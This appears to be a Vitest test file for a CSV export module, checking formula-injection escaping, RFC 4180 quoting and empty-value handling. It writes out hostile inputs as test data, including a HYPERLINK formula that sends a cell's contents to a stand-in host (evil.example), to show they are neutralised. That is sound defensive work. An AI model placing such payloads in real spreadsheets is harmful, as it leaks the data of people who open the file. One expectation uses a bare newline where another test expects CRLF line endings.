import { describe, expect, it } from 'vitest';
import { escapeCell, toCsv } from './csv';

describe('escapeCell — formula injection', () => {
  it('neutralises every formula-triggering prefix', () => {
    // Without the leading quote these execute when the file is opened.
    expect(escapeCell('=1+1')).toBe("'=1+1");
    expect(escapeCell('+1')).toBe("'+1");
    expect(escapeCell('-1')).toBe("'-1");
    expect(escapeCell('@SUM(A1)')).toBe("'@SUM(A1)");
  });

  it('neutralises the classic exfiltration payload', () => {
    const payload = '=HYPERLINK("http://evil.example?d="&A1,"click")';
    const escaped = escapeCell(payload);
    // The cell also contains quotes and a comma, so it is RFC-quoted as well. The
    // security property is that the formula character is no longer leading.
    expect(escaped.startsWith('"\'=')).toBe(true);
    expect(escaped).not.toMatch(/^"?=/);
  });

  it('does not treat a negative number as a formula', () => {
    // Numbers go through the numeric path, so they stay usable as numbers.
    expect(escapeCell(-5)).toBe('-5');
    expect(escapeCell(-5.25)).toBe('-5.25');
  });

  it('handles leading whitespace used to smuggle a formula past a naive check', () => {
    // A tab needs no RFC quoting, but it must still not lead into a formula.
    expect(escapeCell('\t=1')).toBe("'\t=1");
    expect(escapeCell('\r=1')).toBe('"\'\r=1"');
  });
});

describe('escapeCell — RFC 4180 quoting', () => {
  it('quotes cells containing a comma', () => {
    expect(escapeCell('a,b')).toBe('"a,b"');
  });

  it('doubles embedded quotes', () => {
    expect(escapeCell('say "hi"')).toBe('"say ""hi"""');
  });

  it('quotes cells containing newlines', () => {
    expect(escapeCell('line1\nline2')).toBe('"line1\nline2"');
  });

  it('leaves plain text alone', () => {
    expect(escapeCell('Grapes')).toBe('Grapes');
  });

  it('renders empty for missing values rather than "null"', () => {
    expect(escapeCell(null)).toBe('');
    expect(escapeCell(undefined)).toBe('');
    expect(escapeCell(Number.NaN)).toBe('');
    expect(escapeCell(Number.POSITIVE_INFINITY)).toBe('');
  });
});

describe('toCsv', () => {
  it('writes a header row and CRLF line endings', () => {
    const csv = toCsv([{ name: 'Grapes', price: 3.5 }]);
    expect(csv).toBe('name,price\r\nGrapes,3.5\r\n');
  });

  it('honours an explicit column order', () => {
    const csv = toCsv([{ b: 2, a: 1 }], ['a', 'b']);
    expect(csv.split('\r\n')[0]).toBe('a,b');
    expect(csv.split('\r\n')[1]).toBe('1,2');
  });

  it('emits missing columns as empty rather than failing', () => {
    const csv = toCsv([{ a: 1 }], ['a', 'missing']);
    expect(csv.split('\r\n')[1]).toBe('1,');
  });

  it('returns just a header for an empty set with known columns', () => {
    expect(toCsv([], ['a', 'b'])).toBe('a,b\n');
  });

  it('returns nothing at all when there is neither data nor columns', () => {
    expect(toCsv([])).toBe('');
  });
});
